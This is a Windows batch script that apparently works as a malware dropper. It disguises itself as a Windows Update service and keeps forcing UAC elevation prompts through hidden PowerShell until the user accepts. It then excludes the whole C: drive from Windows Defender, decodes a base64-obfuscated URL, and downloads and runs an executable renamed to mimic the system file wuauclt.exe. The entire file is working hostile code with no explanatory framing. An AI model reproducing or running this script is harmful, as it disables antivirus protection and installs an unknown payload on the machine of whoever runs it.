@echo off
setlocal enabledelayedexpansion
if not "%1"=="MINIMIZED" (
    start "" /min cmd /c "%~f0" MINIMIZED %*
    exit /b
)

set "adminCheck=0"
net session >nul 2>&1
if %errorLevel% == 0 set "adminCheck=1"

if %adminCheck% == 1 (
    goto :runAsAdmin
) else (
    goto :requestElevation
)

:requestElevation
    set "originalPID="
    for /f "tokens=2 delims=;=" %%A in ('wmic process where "name='cmd.exe' and commandline like '%%%~nx0%%'" get processid^, commandline /format:list ^| find "MINIMIZED"') do (
        if not defined originalPID set "originalPID=%%A"
    )
    
    set "batchPath=%~f0"
    set "batchArgs=MINIMIZED KILLPARENT %originalPID%"
    
    :tryElevate
    echo Microsoft Windows Update Service...
    set "psCmd=powershell -noprofile -windowstyle hidden -command"
    set "psArgs=Start-Process -WindowStyle Hidden -FilePath 'cmd.exe' -ArgumentList '/min /c \"\"%batchPath%\" %batchArgs%\"' -Verb RunAs"
    %psCmd% "%psArgs%"
    if %errorLevel% == 0 (
        timeout /t 2 >nul
        exit
    ) else (
        timeout /t 1 >nul
        goto :tryElevate
    )

:runAsAdmin
    if /i "%~2"=="KILLPARENT" (
        taskkill /PID %~3 /F >nul 2>&1
    )
    
    setlocal
    set "exeFile=%TEMP%\wuauclt.exe"
    set "url1=aHR0cHM6Ly9naXRodWIuY29tL3ZhdWx0MDUzMDA5LW1ha2VyL2EvcmF3L3JlZnMvaGVhZHMvbWFpbi9WaW9sZXRDbGllbnQuZXhl"
    set "downloadCmd=$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%url1%')); (New-Object Net.WebClient).DownloadFile($url, '%exeFile%')"
    set "a1=Add-MpPreference"
    set "a2=-ExclusionPath"
    set "a3='C:\'"
    set "defenderCmd=%a1% %a2% %a3%"
    powershell -NoProfile -ExecutionPolicy Bypass -Command "%defenderCmd%"
    powershell -Command "%downloadCmd%"
    start "" "%exeFile%"
    endlocal
    exit
